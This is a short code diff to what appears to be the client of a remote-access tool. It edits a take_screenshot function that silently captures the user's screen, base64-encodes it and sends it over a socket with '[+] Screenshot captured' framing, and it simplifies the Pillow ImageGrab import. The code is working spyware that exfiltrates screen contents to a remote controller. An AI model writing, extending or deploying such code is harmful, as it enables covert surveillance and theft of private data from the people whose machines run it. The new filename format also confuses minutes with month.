@@ -7,16 +7,8 @@ import sys
 import base64
 import io 
 
-try:
-    from PIL import ImageGrab
-except Exception:
-    # Fall back to pyscreenshot if Pillow is not available (helps environments
-    # where PIL cannot be resolved). If neither is available, ImageGrab will
-    # be None and callers should handle that case.
-    try:
-        from pyscreenshot import grab as ImageGrab  # type: ignore
-    except Exception:
-        ImageGrab = None
+
+from PIL import ImageGrab # type: ignore
 from pathlib import Path
 from collections.abc import MutableSequence
 from time import sleep
@@ -66,16 +58,16 @@ def take_screenshot(c):
     try:
         img = ImageGrab.grab()
         buf = io.BytesIO()
-        img.save(buf, format="PNG")
+        img.save(buf, format="png")
         raw_bytes = buf.getvalue()
 
         encoded = base64.b64encode(raw_bytes).decode('utf-8')
 
         header = (
             f"[+] Screenshot captured\n"
-            f"[+] Filename: screenshot.png\n"
+            f"[+] Filename: {datetime.now().strftime("%d_%M_%Y  %H_%M_%S")}.png\n"
             f"[+] Size: {len(raw_bytes)} bytes\n"
-            f"[FILE_START]"
+            f"[FILE_START]\n"
         )
         c.send(header.encode())
         c.send(encoded.encode())
